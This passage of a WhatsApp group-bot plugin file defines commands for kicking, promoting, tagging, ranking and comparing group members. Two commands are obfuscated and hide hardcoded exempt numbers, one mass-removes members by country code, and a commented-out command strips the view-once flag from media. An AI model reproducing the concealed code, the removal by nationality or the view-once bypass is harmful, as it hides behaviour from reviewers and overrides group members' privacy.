var _0x87a531=_0xd64c;(function(_0x26f08a,_0x14609e){var _0x98c35b=_0xd64c,_0x1aec32=_0x26f08a();while(!![]){try{var _0x14857e=-parseInt(_0x98c35b(0xcb))/0x1+-parseInt(_0x98c35b(0xcf))/0x2+parseInt(_0x98c35b(0xe7))/0x3*(parseInt(_0x98c35b(0xdb))/0x4)+-parseInt(_0x98c35b(0xe4))/0x5+-parseInt(_0x98c35b(0xd0))/0x6+parseInt(_0x98c35b(0xd2))/0x7+parseInt(_0x98c35b(0xda))/0x8*(parseInt(_0x98c35b(0xdf))/0x9);if(_0x14857e===_0x14609e)break;else _0x1aec32['push'](_0x1aec32['shift']());}catch(_0x311bff){_0x1aec32['push'](_0x1aec32['shift']());}}}(_0x4a96,0xef9b1));let jids=await parsedJid(text);var group1,group2;if(jids[_0x87a531(0xee)]>0x1)group1=jids[0x0][_0x87a531(0xca)](_0x87a531(0xd5))?jids[0x0]:citel[_0x87a531(0xdd)],group2=jids[0x1][_0x87a531(0xca)](_0x87a531(0xd5))?jids[0x1]:citel[_0x87a531(0xdd)];else{if(jids[_0x87a531(0xee)]==0x1)group1=citel[_0x87a531(0xdd)],group2=jids[0x0]['includes']('@g.us')?jids[0x0]:citel[_0x87a531(0xdd)];else return await citel['send'](_0x87a531(0xdc));}if(group2===group1)return await citel[_0x87a531(0xd1)](_0x87a531(0xe2));var g1=await Void['groupMetadata'](group1),g2=await Void['groupMetadata'](group2),common=g1[_0x87a531(0xe8)]['filter'](({id:_0x215617})=>g2['participants'][_0x87a531(0xd3)](({id:_0xa9d3a3})=>_0xa9d3a3===_0x215617))||[];if(common[_0x87a531(0xee)]==0x0)return await citel[_0x87a531(0xd1)]('Theres\x20no\x20Common\x20Users\x20in\x20Both\x20Groups');let kick=text[_0x87a531(0xe9)](',')[0x0][_0x87a531(0xce)]()===_0x87a531(0xe3)?!![]:![],reason=![];var heading=_0x87a531(0xec);if(kick){let chat={'chat':group1};heading='\x20\x20*Kicking\x20Common\x20Participants*';const groupAdmins=await getAdmin(Void,chat)||[];var botNumber=await Void['decodeJid'](Void['user']['id']),isBotAdmins=groupAdmins[_0x87a531(0xca)](botNumber)||![],isAdmins=groupAdmins[_0x87a531(0xca)](citel[_0x87a531(0xe0)])||![];(!isBotAdmins||!isAdmins)&&(kick=![],heading=_0x87a531(0xe6)),!isBotAdmins&&(reason='*❲❒❳\x20Reason:*\x20_I\x20Can\x27t\x20Kick\x20Common\x20Participants\x20Without\x20Getting\x20Admin\x20Role,So\x20Provide\x20Admin\x20Role\x20First,_\x0a'),!isAdmins&&(reason='*❲❒❳\x20Reason:*\x20_Uhh\x20Dear,\x20Only\x20Group\x20Admin\x20Can\x20Kick\x20Common\x20Users\x20Through\x20This\x20Cmd_\x0a');}function _0xd64c(_0x32c6f8,_0x2d697c){var _0x4a96f3=_0x4a96();return _0xd64c=function(_0xd64cbf,_0x5aabfa){_0xd64cbf=_0xd64cbf-0xc9;var _0x256505=_0x4a96f3[_0xd64cbf];return _0x256505;},_0xd64c(_0x32c6f8,_0x2d697c);}function _0x4a96(){var _0x375d41=['sender','push','Please\x20Provide\x20Valid\x20Group\x20Jid','kick','7605210eeYGmA','923184474176@s.whatsapp.net','\x20\x20*乂\x20Can\x27t\x20Kick\x20Common\x20Participants*','138543ZVCNcn','participants','split','@s.whatsapp.net','\x0a*❲❒❳\x20Group2:*\x20','\x20\x20\x20*List\x20Of\x20Common\x20Participants*','user','length','caption','includes','946278jKrKhT','_Members_\x0a\x0a\x0a','\x0a*❲❒❳\x20Group1:*\x20','trim','1283014cwDqub','6253704DutAwi','send','12524057XHlruT','some','\x0a\x0a\x0a©','@g.us','923004591719@s.whatsapp.net','\x20\x20*⬡*\x20@','\x20\x20\x20\x0a','groupParticipantsUpdate','3132728ehxlpC','120EgDLWk','*_Uhh\x20Dear,\x20Please\x20Provide\x20a\x20Group\x20Jid,_*\x0a*To\x20Get\x20common\x20participants\x20in\x20two\x20groups,*\x0a*Also\x20kick\x20using\x20.common\x20kick,\x20jid*','chat','Error\x20removing\x20participants:','45UpvHCU'];_0x4a96=function(){return _0x375d41;};return _0x4a96();}var msg='\x20'+heading+_0x87a531(0xd8)+(reason?reason:'')+_0x87a531(0xcd)+g1['subject']+_0x87a531(0xeb)+g2['subject']+'\x0a*❲❒❳\x20Common\x20Counts:*\x20_'+common[_0x87a531(0xee)]+_0x87a531(0xcc),commons=[];common['map'](async _0x5484ff=>{var _0x4ac9dd=_0x87a531;msg+=_0x4ac9dd(0xd7)+_0x5484ff['id'][_0x4ac9dd(0xe9)]('@')[0x0]+'\x0a',commons[_0x4ac9dd(0xe1)](_0x5484ff['id']['split']('@')[0x0]+_0x4ac9dd(0xea));}),await citel[_0x87a531(0xd1)](msg+(_0x87a531(0xd4)+Config[_0x87a531(0xc9)]),{'mentions':commons});if(kick&&!reason)try{var botNumber=await Void['decodeJid'](Void[_0x87a531(0xed)]['id']);for(const user of commons){if(botNumber===user||user===_0x87a531(0xd6)||user===_0x87a531(0xe5))continue;await new Promise(_0x5d963f=>setTimeout(_0x5d963f,0x3e8)),await Void[_0x87a531(0xd9)](group1,[user],'remove');}}catch(_0x5636c1){console['error'](_0x87a531(0xde),_0x5636c1);}return;
});
//---------------------------------------------------------------------------
cmd({
    pattern: "diff",
    desc: "Get difference of participants in two groups",
    category: "owner",
    filename: __filename,

},
async(Void, citel, text,{ isCreator }) => {          
function _0x32d6(_0x1c5452,_0xd9c18b){var _0x2c296b=_0x2c29();return _0x32d6=function(_0x32d6d6,_0x371807){_0x32d6d6=_0x32d6d6-0x1ae;var _0x3418f7=_0x2c296b[_0x32d6d6];return _0x3418f7;},_0x32d6(_0x1c5452,_0xd9c18b);}function _0x2c29(){var _0x45aad0=['\x20\x20*⬡*\x20@','send','includes','filter','\x0a*❲❒❳\x20Differ\x20Counts:*\x20_','length','participants','3634530paWHrR','subject','48PrVAuc','130RPKGzs','chat','\x0a\x0a\x0a©','8110230jpjYbb','groupMetadata','\x20\x20*乂\x20List\x20Of\x20Different\x20Participants*\x20\x0a\x0a*❲❒❳\x20Group1:*\x20','7080cVcMZN','4qYOlNg','split','1733097idxGVh','@s.whatsapp.net','push','@g.us','\x0a*❲❒❳\x20Group2:*\x20','321146RceypW','map','*_Uhh\x20Dear,\x20Please\x20Provide\x20a\x20Group\x20Jid_*\x0a*_To\x20Get\x20Different\x20participants\x20with\x20in\x20group_*','190807KCVkbV','388449gIdOpg','_Members_\x0a\x0a\x0a'];_0x2c29=function(){return _0x45aad0;};return _0x2c29();}var _0x1d7f58=_0x32d6;(function(_0x17cc23,_0x4b891e){var _0x39378e=_0x32d6,_0x3fed02=_0x17cc23();while(!![]){try{var _0x3a2e9b=parseInt(_0x39378e(0x1c5))/0x1+-parseInt(_0x39378e(0x1ba))/0x2+parseInt(_0x39378e(0x1bd))/0x3*(-parseInt(_0x39378e(0x1bb))/0x4)+parseInt(_0x39378e(0x1b7))/0x5+-parseInt(_0x39378e(0x1b1))/0x6+parseInt(_0x39378e(0x1c2))/0x7*(-parseInt(_0x39378e(0x1b3))/0x8)+-parseInt(_0x39378e(0x1c6))/0x9*(-parseInt(_0x39378e(0x1b4))/0xa);if(_0x3a2e9b===_0x4b891e)break;else _0x3fed02['push'](_0x3fed02['shift']());}catch(_0x4a2b92){_0x3fed02['push'](_0x3fed02['shift']());}}}(_0x2c29,0xde944));let jids=await parsedJid(text);var group1,group2;if(jids[_0x1d7f58(0x1af)]>0x1)group1=jids[0x0][_0x1d7f58(0x1ca)]('@g.us')?jids[0x0]:citel[_0x1d7f58(0x1b5)],group2=jids[0x1][_0x1d7f58(0x1ca)]('@g.us')?jids[0x1]:citel[_0x1d7f58(0x1b5)];else{if(jids[_0x1d7f58(0x1af)]==0x1)group1=citel[_0x1d7f58(0x1b5)],group2=jids[0x0][_0x1d7f58(0x1ca)](_0x1d7f58(0x1c0))?jids[0x0]:citel['chat'];else return await citel['send'](_0x1d7f58(0x1c4));}if(group2===group1)return await citel[_0x1d7f58(0x1c9)]('Please\x20Provide\x20Valid\x20Group\x20Jid');var g1=await Void[_0x1d7f58(0x1b8)](group1),g2=await Void[_0x1d7f58(0x1b8)](group2),diff=g1[_0x1d7f58(0x1b0)][_0x1d7f58(0x1cb)](({id:_0x240eaa})=>!g2['participants']['some'](({id:_0x5fe1e0})=>_0x5fe1e0===_0x240eaa))||[];if(diff[_0x1d7f58(0x1af)]==0x0)return await citel[_0x1d7f58(0x1c9)]('Theres\x20no\x20Different\x20Users\x20in\x20Both\x20Groups');var msg=_0x1d7f58(0x1b9)+g1[_0x1d7f58(0x1b2)]+_0x1d7f58(0x1c1)+g2[_0x1d7f58(0x1b2)]+_0x1d7f58(0x1ae)+diff[_0x1d7f58(0x1af)]+_0x1d7f58(0x1c7),diffs=[];diff[_0x1d7f58(0x1c3)](async _0x299f43=>{var _0x5dc1b3=_0x1d7f58;msg+=_0x5dc1b3(0x1c8)+_0x299f43['id'][_0x5dc1b3(0x1bc)]('@')[0x0]+'\x0a',diffs[_0x5dc1b3(0x1bf)](_0x299f43['id'][_0x5dc1b3(0x1bc)]('@')[0x0]+_0x5dc1b3(0x1be));});return await citel[_0x1d7f58(0x1c9)](msg+(_0x1d7f58(0x1b6)+Config['caption']),{'mentions':diffs});
});
//---------------------------------------------------------------------------
    cmd({
        pattern: "block",
        desc: "blocks that person",
        fromMe: true,
        category: "owner",
        filename: __filename,
        use: '<quote/reply user.>'
    },
    async(Void, citel, text,{isCreator}) => {
        if (!isCreator) citel.reply(tlang().owner);
        let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid[0] ? citel.mentionedJid[0] : "";
        if(!users)  return await citel.reply("*Uhh dear, reply/mention an User*")
        await Void.updateBlockStatus(users, "block")
            .then((res) => { return Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});    })		    //console.log(jsonformat(res))
            .catch((err) => console.log(jsonformat(err)));

    }
)
//---------------------------------------------------------------------------
cmd({
            pattern: "unblock",
            desc: "Unblocked to the quoted user.",
            category: "owner",
            filename: __filename,

        },
        async(Void, citel, text,{ isCreator }) => {
            if (!isCreator) citel.reply(tlang().owner);
            let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid[0] ? citel.mentionedJid[0] : false ;
            if(!users)  return await citel.reply("*Uhh dear, reply/mention an User*")
	    let num = users.replace("@s.whatsapp.net","")
            await Void.updateBlockStatus(users, "unblock")
                .then((res) => citel.send(`*@${num} Unblocked Succesfully..!*`,{mentions : [ users , ]}))
                .catch((err) => console.log(jsonformat(err)));
        }
    )
    //---------------------------------------------------------------------------
    cmd({
        pattern: "invite",
        desc: "get group link.",
        category: "group",
        filename: __filename,
    },
	 async(Void, citel, text,{ isCreator }) => {
	    if (!citel.isGroup) return citel.reply(tlang().group);
	    
        const groupAdmins = await getAdmin(Void, citel)	
	    const botNumber = await Void.decodeJid(Void.user.id)
        const isBotAdmins =groupAdmins.includes(botNumber)
	
if (!isBotAdmins) return citel.reply("*_I'm Not Admin, So I can't Send Invite Link_*");
var str1 = await Void.groupInviteCode(citel.chat)
var str2 ="https://chat.whatsapp.com/"
var mergedString = `${str2}${str1}`;
return citel.reply("*Group Invite Link Is Here* \n*"+mergedString+"*");
	
    }
	)
	
  //---------------------------------------------------------------------------
    cmd({
        pattern: "revoke",
        desc: "get group link.",
        category: "group",
        filename: __filename,
    },
	 async(Void, citel, text,{ isCreator }) => {
	    if (!citel.isGroup) return citel.reply(tlang().group);
	    
        const groupAdmins = await getAdmin(Void, citel)	
	const botNumber = await Void.decodeJid(Void.user.id)
        const isBotAdmins =groupAdmins.includes(botNumber)
	if (!isBotAdmins) return citel.reply("*_I'm Not Admin, So I Can't ReSet Group Invite Link_*");
	    
var code = await Void.groupRevokeInvite(citel.chat)
return citel.reply("*_Group Link Revoked SuccesFully_*");
	
    }
	)
    //---------------------------------------------------------------------------
    cmd({
        pattern: "jid",
        desc: "get jid of all user in a group.",
        category: "owner",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => {
      if (citel.quoted)  return citel.reply(citel.quoted.sender)
	    
	    
	  /*  if(!isCreator) return citel.reply(tlang().owner)
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
		const participants = citel.isGroup ? await groupMetadata.participants : "";
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `📍 ${mem.id}\n`;
        }*/
     else return citel.reply(citel.chat)

    }
)

    //---------------------------------------------------------------------------
cmd({
        pattern: "tagall",
        desc: "Tags every person of group.",
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!citel.isGroup) return citel.reply(tlang().group);
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
        const participants = citel.isGroup ? await groupMetadata.participants : "";
        const groupAdmins = await getAdmin(Void, citel)
        const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
        if (!isAdmins && !isCreator) return citel.reply(tlang().admin);

        let textt = `
══✪〘   *Tag All*   〙✪══

➲ *Message :* ${text ? text : "blank Message"} \n ${Config.caption} \n\n
➲ *Author:* ${citel.pushName} 🔖
`
        for (let mem of participants) { textt += `📍 @${mem.id.split("@")[0]}\n`;   }
        Void.sendMessage(citel.chat, { text: textt,  mentions: participants.map((a) => a.id) }, {  quoted: citel });
    }
)

    //---------------------------------------------------------------------------
cmd({
        pattern: "kik",
        desc: "Kick all numbers from a certain country",
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => 
    {	
        if (!citel.isGroup) return citel.reply(tlang().group);
	if(!text) return await citel.reply("*Provide Me Country Code. Example: .kik 91*")
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
	const groupAdmins = await getAdmin(Void, citel)
        let isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) :  false  ;
        if (!isAdmins)
	{
		if(isCreator) citel.reply("*Hey Owner, You Are not Admin Here*")
		else return citel.reply(tlang().admin);
	}
	let find = text.split(" ")[0].replace('+' , '');
	let error = '*These Users Not Kicked* \n\t' ;
	let users = await groupMetadata.participants
	let hmanykik = 0;
	let iskikstart = false ;
	const botNumber = await Void.decodeJid(Void.user.id)
	for (let i of users) { 
		let isuseradmin  =  groupAdmins.includes(i.id) || false 
		if(i.id.startsWith(find) && !isuseradmin)
		{ 
			if(!iskikstart)
			{
				iskikstart = true ;
				await citel.reply(`*_Kicking ALL the Users With ${find} Country Code_*`)
			}
			try { await Void.groupParticipantsUpdate(citel.chat, [i.id], "remove"); hmanykik++ ;  }
			catch (e) { console.log("Error While Kicking : " , e) } 	
		}
	}
	if(hmanykik == 0) return await citel.reply(`*_Ahh, There Is No User Found With ${find} Country Code_*`)
        else return await citel.reply(`*_Hurray, ${hmanykik.toString()} Users With ${find} Country Code kicked_*`)
})
//---------------------------------------------------------------------------
cmd({
        pattern: "num",
        desc: "get all numbers from a certain country",
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => 
    {	
        if (!citel.isGroup) return citel.reply(tlang().group);
	if(!text) return await citel.reply("*Provide Me Country Code. Example: .num 91*")
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
	const groupAdmins = await getAdmin(Void, citel)
        const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) :  false  ;
        if (!isAdmins && !isCreator ) return citel.reply(tlang().admin);
	let find = text.split(" ")[0];
	let users = await groupMetadata.participants
	let nums = `*List Of Users With ${find} Country Code*\n`
	let num = '';
	for (let i of users) {  if(i.id.startsWith(find)) num += i.id.split("@")[0] +"\n";   }
	if(!num) {nums =`*There Is No Users With ${find} Country Code*` }
	else { nums += num+Config.caption }
	await citel.reply(nums)		
})
//---------------------------------------------------------------------------
/*
cmd({
            pattern: "request",
            desc: "Sends requst to main Bot developer.",
            category: "group",
            filename: __filename,
            use: '<text>',
        },
        async(Void, citel, text) => {
            if (!text) return reply(`Example : ${prefix}request hello dev please add a downloader feature`);
            textt = `*| REQUEST |*`;
            teks1 = `\n\n*User* : @${
    citel.sender.split("@")[0]
  }\n*Request* : ${text}`;
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait.......*`;
            for (let i of owner) {
                Void.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [citel.sender],
                }, {
                    quoted: citel,
                });
            }
            Void.sendMessage(citel.chat, {
                text: textt + teks2 + teks1,
                mentions: [citel.sender],
            }, {
                quoted: citel,
            });

        }
    )*/

    //---------------------------------------------------------------------------
/*
cmd({
            pattern: "retrive",
	    alias: ["vv"],
            desc: "Copies and Forwords viewonce message.",
            category: "group",
            filename: __filename,
            use: '<reply to a viewonce message.>',
        },
        async(Void, citel, text) => {
            if (!citel.quoted) return reply(`Please reply to any message Image or Video!`);
            let mime = citel.quoted.mtype
            if (/viewOnce/.test(mime)) {
                const mtype = Object.keys(quoted.message)[0];
                delete quoted.message[mtype].viewOnce;
                const msgs = proto.Message.fromObject({
                    ...quoted.message,
                  });
                const prep = generateWAMessageFromContent(citel.chat, msgs, { quoted: citel });
                await Void.relayMessage(citel.chat, prep.message, { messageId: prep.key.id });
            } else {
                await citel.reply("please, reply to viewOnceMessage");
            }
        }
    )*/

    //---------------------------------------------------------------------------
cmd({
            pattern: "resetwarn",
            desc: "Deletes all previously given warns to quoted user.",
            category: "group",
           filename: __filename,
            use: '<quote|reply|number>',
        },
        async(Void, citel, text , {isCreator}) => {
            if (!isCreator) return citel.reply(tlang().owner)
            await warndb.deleteOne({ id: citel.quoted.sender.split('@')[0] + 'warn' });
            citel.reply('User is free as a bird.\nAll previously given warn has been deleted.')
        }
    )
    //---------------------------------------------------------------------------
cmd({
            pattern: "poll",
            desc: "Makes poll in group.",
            category: "group",
            filename: __filename,
            use: `question;option1,option2,option3.....`,
        },
        async(Void, citel, text,{ isCreator }) => {
            if (!isCreator) return citel.reply(tlang().owner)
            let [poll, opt] = text.split(";");
            if (text.split(";") < 2) return await citel.reply(`${prefix}poll question;option1,option2,option3.....`);
            let options = [];
            for (let i of opt.split(',')) {  options.push(i);  }
            await Void.sendMessage(citel.chat, { poll: { name: poll,  values: options } })
        }
    )
    //---------------------------------------------------------------------------
cmd({
            pattern: "profile",
            desc: "Shows profile of user.",
            category: "group",
            filename: __filename,
        },
        async(Void, citel, text) => {
            var bio = await Void.fetchStatus(citel.sender);
            var bioo = bio.status;
            let meh = citel.sender;
            const userq = await Levels.fetch(citel.sender, "RandomXP");
            const lvpoints = userq.level;
            var role = "GOD✨";
             if (lvpoints <=  2) { var role = "🏳Citizen"; } 
	else if (lvpoints <=  4) { var role = "👼Baby Wizard"; } 
	else if (lvpoints <=  6) { var role = "🧙‍♀️Wizard";  } 
	else if (lvpoints <=  8) { var role = "🧙‍♂️Wizard Lord"; }
	else if (lvpoints <= 10) { var role = "🧚🏻Baby Mage";  } 
	else if (lvpoints <= 12) { var role = "🧜Mage"; } 
	else if (lvpoints <= 14) { var role = "🧜‍♂️Master of Mage";} 
	else if (lvpoints <= 16) { var role = "🌬Child of Nobel"; } 
	else if (lvpoints <= 18) { var role = "❄Nobel"; }
	else if (lvpoints <= 20) { var role = "⚡Speed of Elite"; } 
	else if (lvpoints <= 22) { var role = "🎭Elite"; } 
	else if (lvpoints <= 24) { var role = "🥇Ace I"; }
	else if (lvpoints <= 26) { var role = "🥈Ace II"; } 
	else if (lvpoints <= 28) { var role = "🥉Ace Master"; }
	else if (lvpoints <= 30) { var role = "🎖Ace Dominator";} 
	else if (lvpoints <= 32) { var role = "🏅Ace Elite"; }
	else if (lvpoints <= 34) { var role = "🏆Ace Supreme";}
	else if (lvpoints <= 36) { var role = "💍Supreme I";}
	else if (lvpoints <= 38) { var role = "💎Supreme Ii";} 
	else if (lvpoints <= 40) { var role = "🔮Supreme Master";} 
	else if (lvpoints <= 42) { var role = "🛡Legend III";} 
	else if (lvpoints <= 44) { var role = "🏹Legend II";} 
	else if (lvpoints <= 46) { var role = "⚔Legend"; } 
	else if (lvpoints <= 55) { var role = "🐉Immortal"; }
	
            let ttms = `${userq.xp}` / 8;
            const timenow = moment(moment())
                .format('HH:mm:ss')
            moment.tz.setDefault('Asia/Karachi')
                .locale('id')
	let pfp;
            try {
                pfp = await Void.profilePictureUrl(citel.sender, "image");
            } catch (e) {
                pfp = await botpic();
            }
            const profile = `
*Hii ${citel.pushName},*
*Here is your profile information*
*👤Username:* ${citel.pushName}
*⚡Bio:* ${bioo}
*🧩Role:* ${role}
*🍁Level:* ${userq.level}
*📥Total Messages* ${ttms}
*Powered by ${tlang().title}*
`;
            
            let buttonMessage = {
                image: { url: pfp },
                caption: profile,
                footer: tlang().footer,
                headerType: 4,
            };
            Void.sendMessage(citel.chat, buttonMessage, { quoted: citel });

        }
    ) 
    //---------------------------------------------------------------------------
cmd({
            pattern: "rank",
            desc: "Sends rank card of user.",
            category: "group",
            filename: __filename,
        },
        async(Void, citel, text) => {
            const userq = await Levels.fetch(citel.sender, "RandomXP");
            const lvpoints = userq.level;
            var role = "GOD✨";
            if (lvpoints <= 2) {
                var role = "🏳Citizen";
            } else if (lvpoints <= 4) {
                var role = "👼Baby Wizard";
            } else if (lvpoints <= 6) {
                var role = "🧙‍♀️Wizard";
            } else if (lvpoints <= 8) {
                var role = "🧙‍♂️Wizard Lord";
            } else if (lvpoints <= 10) {
                var role = "🧚🏻Baby Mage";
            } else if (lvpoints <= 12) {
                var role = "🧜Mage";
            } else if (lvpoints <= 14) {
                var role = "🧜‍♂️Master of Mage";
            } else if (lvpoints <= 16) {
                var role = "🌬Child of Nobel";
            } else if (lvpoints <= 18) {
                var role = "❄Nobel";
            } else if (lvpoints <= 20) {
                var role = "⚡Speed of Elite";
            } else if (lvpoints <= 22) {
                var role = "🎭Elite";
            } else if (lvpoints <= 24) {
                var role = "🥇Ace I";
            } else if (lvpoints <= 26) {
                var role = "🥈Ace II";
            } else if (lvpoints <= 28) {
                var role = "🥉Ace Master";
            } else if (lvpoints <= 30) {
                var role = "🎖Ace Dominator";
            } else if (lvpoints <= 32) {
                var role = "🏅Ace Elite";
            } else if (lvpoints <= 34) {
                var role = "🏆Ace Supreme";
            } else if (lvpoints <= 36) {
                var role = "💍Supreme I";
            } else if (lvpoints <= 38) {
                var role = "💎Supreme Ii";
            } else if (lvpoints <= 40) {
                var role = "🔮Supreme Master";
            } else if (lvpoints <= 42) {
                var role = "🛡Legend III";
            } else if (lvpoints <= 44) {
                var role = "🏹Legend II";
            } else if (lvpoints <= 46) {
                var role = "⚔Legend";
            } else if (lvpoints <= 55) {
                var role = "🐉Immortal";
            }
            let disc = citel.sender.substring(3, 7);
            let textr = '';
            textr += `*Hii ${tlang().greet} ,🌟 ${citel.pushName}∆${disc}'s* Exp\n\n`;
            let ttms = `${userq.xp}` / 8;
            textr += `*🌟Role*: ${role}\n*🟢Exp*: ${userq.xp} / ${Levels.xpFor(
    userq.level + 1
  )}\n*🏡Level*: ${userq.level}\n*Total Messages:*- ${ttms}`;
            try {
                ppuser = await Void.profilePictureUrl(citel.sender, "image");
            } catch {
                ppuser = THUMB_IMAGE;
            }
                    Void.sendMessage(citel.chat, {
                        image: await getBuffer(ppuser),
                        caption: textr,
                    }, {
                        quoted: citel,
                    });
        }
    )
    //---------------------------------------------------------------------------
cmd({
            pattern: "leaderboard",
            alias: ["deck"],
            desc: "To check leaderboard",
            category: "general",
            filename: __filename,
        },
        async(Void, citel) => {
            const fetchlb = await Levels.fetchLeaderboard("RandomXP", 5);
            let leadtext = `
*-------------------------------*
*----● LeaderBoard ● -----*
*-------------------------------*
\n\n`
            for (let i = 0; i < fetchlb.length; i++) {
                const lvpoints = fetchlb[i].level
                var role = "GOD✨";
                if (lvpoints <= 2) {
                    var role = "🏳Citizen";
                } else if (lvpoints <= 4) {
                    var role = "👼Baby Wizard";
                } else if (lvpoints <= 6) {
                    var role = "🧙‍♀️Wizard";
                } else if (lvpoints <= 8) {
                    var role = "🧙‍♂️Wizard Lord";
                } else if (lvpoints <= 10) {
                    var role = "🧚🏻Baby Mage";
                } else if (lvpoints <= 12) {
                    var role = "🧜Mage";
                } else if (lvpoints <= 14) {
                    var role = "🧜‍♂️Master of Mage";
                } else if (lvpoints <= 16) {
                    var role = "🌬Child of Nobel";
                } else if (lvpoints <= 18) {
                    var role = "❄Nobel";
                } else if (lvpoints <= 20) {
                    var role = "⚡Speed of Elite";
                } else if (lvpoints <= 22) {
                    var role = "🎭Elite";
                } else if (lvpoints <= 24) {
                    var role = "🥇Ace I";
                } else if (lvpoints <= 26) {
                    var role = "🥈Ace II";
                } else if (lvpoints <= 28) {
                    var role = "🥉Ace Master";
                } else if (lvpoints <= 30) {
                    var role = "🎖Ace Dominator";
                } else if (lvpoints <= 32) {
                    var role = "🏅Ace Elite";
                } else if (lvpoints <= 34) {
                    var role = "🏆Ace Supreme";
                } else if (lvpoints <= 36) {
                    var role = "💍Supreme I";
                } else if (lvpoints <= 38) {
                    var role = "💎Supreme Ii";
                } else if (lvpoints <= 40) {
                    var role = "🔮Supreme Master";
                } else if (lvpoints <= 42) {
                    var role = "🛡Legend III";
                } else if (lvpoints <= 44) {
                    var role = "🏹Legend II";
                } else if (lvpoints <= 46) {
                    var role = "⚔Legend";
                } else if (lvpoints <= 55) {
                    var role = "🐉Immortal";
                }
                let data = await sck1.findOne({ id: fetchlb[i].userID })
                let namew = fetchlb[i].userID
                let ttms = fetchlb[i].xp / 8
                leadtext += `*${i + 1}●Name*: ${data.name}\n*●Level*: ${fetchlb[i].level}\n*●Points*: ${fetchlb[i].xp}\n*●Role*: ${role}\n*●Total messages*: ${ttms}\n\n`;
            }
            return citel.reply(leadtext)
        }
    )

    //---------------------------------------------------------------------------
cmd({
            pattern: "promote",
            desc: "Provides admin role to replied/quoted user",
            category: "group",
            filename: __filename,
            use: '<quote|reply|number>',
        },
        async(Void, citel, text ,{ isCreator }) => {	
            if (!citel.isGroup) return citel.reply(tlang().group);
            const groupAdmins = await getAdmin(Void, citel)
            const botNumber = await Void.decodeJid(Void.user.id)
            const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
	        if (!isBotAdmins) return citel.reply("*_I'm Not Admin Here, So I Can't Promote Someone_*");
            if (!isAdmins) return citel.reply(tlang().admin);
            
            try {
                let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid[0] ? citel.mentionedJid[0] : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
                if (!users) return await citel.send("*_Uhh Dear, Reply/Mention to an User_*");
                await Void.groupParticipantsUpdate(citel.chat, [users], "promote");
                await citel.send(`*User promoted Succesfully!*`)
                return await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});
            } catch(e) {
                console.log("Promote error : " , e )
                await Void.sendMessage(citel.chat, { react: { text: '❌', key: citel.key }});
                return await citel.reply(tlang().botAdmin);
            }
        }
    )
    //---------------------------------------------------------------------------
cmd({
    pattern: "demote",
    desc: "Demotes replied/quoted user from group",
    category: "group",
    filename: __filename,
    use: '<quote|reply|number>',
},
async(Void, citel, text,{ isCreator }) => {
//if (!isCreator) return citel.reply("```Only My Owner Can Use This Command```")
    if (!citel.isGroup) return citel.reply(tlang().group);
    const groupAdmins = await getAdmin(Void, citel)
    const botNumber = await Void.decodeJid(Void.user.id)
    const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
    if (!isBotAdmins) return await citel.reply(`*_I'm Not Admin In This Group, Idiot_*`); 
    if (!isAdmins) return citel.reply(tlang().admin);
    
    try {
        let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid[0] ? citel.mentionedJid[0] : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        if (!users) return await citel.send("*_Uhh Dear, Reply/Mention to an User_*");
        await Void.groupParticipantsUpdate(citel.chat, [users], "demote");
        await citel.send(`*User demoted Succesfully!*`)
        return await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});
    } catch(e) {
        console.log("Demote error : " , e )
        await Void.sendMessage(citel.chat, { react: { text: '❌', key: citel.key }});
        return await citel.reply(tlang().botAdmin);    
    }

}
)

//---------------------------------------------------------------------------
cmd({
            pattern: "kick",
            desc: "Kicks replied/quoted user from group.",
            category: "group",
            filename: __filename,
            use: '<quote|reply|number>',
        },
        async(Void, citel, text ,{ isCreator }) => {
	//if (!isCreator) return citel.reply("*_Only My Owner Can Use This Command_*")
            if (!citel.isGroup) return citel.reply(tlang().group);
            const groupAdmins = await getAdmin(Void, citel)
            const botNumber = await Void.decodeJid(Void.user.id)
            const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
            if (!isBotAdmins) return await citel.reply(`*_I'm Not Admin In This Group, Idiot_*`);  
            if (!isAdmins) return citel.reply(tlang().admin);
            
            try {
                let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid[0] ? citel.mentionedJid[0] : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
                if (!users) return citel.send("*_Uhh Dear, Reply/Mention to an User_*");
                await Void.groupParticipantsUpdate(citel.chat, [users], "remove");
                await citel.send(`*Hurray, User Kicked Succesfully!*`)
                return await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});
            } catch(e) {
                console.log("Kick error : " , e )
                await Void.sendMessage(citel.chat, { react: { text: '❌', key: citel.key }});
                return await citel.reply(tlang().botAdmin);

